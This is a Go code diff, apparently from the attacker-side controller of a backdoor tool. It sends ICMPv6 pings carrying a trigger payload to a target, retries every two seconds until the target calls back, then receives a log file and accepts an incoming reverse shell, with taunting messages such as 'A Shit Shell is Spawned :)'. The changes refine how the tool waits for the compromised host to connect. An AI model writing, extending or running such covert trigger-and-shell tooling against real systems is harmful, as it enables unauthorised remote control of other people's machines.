@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv6"
@@ -34,8 +35,22 @@ func ping(meme string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	if _, err := c.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(os.Args[1])}); err != nil {
-		log.Fatalf("WriteTo err, %s", err)
+	var pingCount int = 0
+	for {
+		select {
+		case <-pause:
+			return
+		default:
+			if pingCount == 3 {
+				fmt.Println("Target Might Just Have Rebooted")
+				fmt.Println("Please Wait for 3-4 Minutes")
+			}
+			if _, err := c.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(os.Args[1])}); err != nil {
+				log.Fatalf("WriteTo err, %s", err)
+			}
+			pingCount += 1
+			time.Sleep(2 * time.Second)
+		}
 	}
 }
 
@@ -53,6 +68,7 @@ func receiveLog(wg *sync.WaitGroup) {
 		os.Exit(1)
 	}
 	fmt.Println("There Is No Place Like", connection.RemoteAddr(), "Wait Fk Off")
+	close(pause)
 	bufferFileSize := make([]byte, 10)
 
 	connection.Read(bufferFileSize)
@@ -90,6 +106,7 @@ func listenShell(wg *sync.WaitGroup) {
 	if nil != err {
 		log.Fatalf("Could not accept connection", err)
 	}
+	close(pause)
 	fmt.Println("Something is coming from", c.RemoteAddr())
 	fmt.Println("A Shit Shell is Spawned :)")
 	// I am HaCk1nG LOL
@@ -112,3 +129,5 @@ func main() {
 	}
 	wg.Wait()
 }
+
+var pause = make(chan bool)
